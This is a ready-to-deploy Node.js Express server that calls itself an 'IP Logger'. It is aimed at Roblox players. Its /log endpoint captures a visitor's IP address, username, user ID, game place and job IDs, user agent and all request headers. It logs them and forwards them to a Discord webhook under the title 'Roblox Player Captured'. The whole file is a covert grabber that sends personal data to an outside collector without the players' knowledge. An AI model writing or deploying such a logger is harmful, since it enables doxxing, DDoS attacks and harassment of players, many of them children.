const express = require('express');
const app = express();

app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} | ${req.method} ${req.path} | IP: ${req.headers['x-forwarded-for']?.split(',')[0] || req.ip}`);
    next();
});

app.get('/log', (req, res) => {
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                     req.headers['x-real-ip'] || 
                     req.connection.remoteAddress || 
                     req.socket.remoteAddress || 
                     req.ip || 'Unknown';
    
    const playerData = {
        timestamp: new Date().toISOString(),
        username: req.query.playerName || 'Unknown',
        userId: req.query.userId || 'Unknown',
        placeId: req.query.placeId || 'Unknown',
        jobId: req.query.jobId || 'Unknown',
        ipAddress: clientIP,
        userAgent: req.get('User-Agent') || 'Unknown',
        headers: req.headers,
        query: req.query
    };
    
    // Log to console (Railway logs)
    console.log('🎮 PLAYER LOGGED:', JSON.stringify(playerData, null, 2));
    
    // Discord webhook (optional - add your URL as env var)
    if (process.env.DISCORD_WEBHOOK) {
        fetch(process.env.DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: '🕵️ Roblox Player Captured',
                    color: 16711680,
                    fields: [
                        { name: '👤 Username', value: playerData.username, inline: true },
                        { name: '🆔 UserID', value: playerData.userId, inline: true },
                        { name: '🌐 IP Address', value: `\`${playerData.ipAddress}\``, inline: true },
                        { name: '📍 Place ID', value: playerData.placeId, inline: true },
                        { name: '🆔 Job ID', value: playerData.jobId, inline: true },
                        { name: '📱 User-Agent', value: playerData.userAgent.slice(0, 50) + '...', inline: false }
                    ],
                    timestamp: playerData.timestamp
                }]
            })
        }).catch(console.error);
    }
    
    res.status(200).json({ status: 'logged', data: playerData });
});

app.get('/health', (req, res) => res.send('Logger active'));

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`🚀 IP Logger running on port ${port}`);
    console.log(`📡 Logging endpoint: /log`);
});
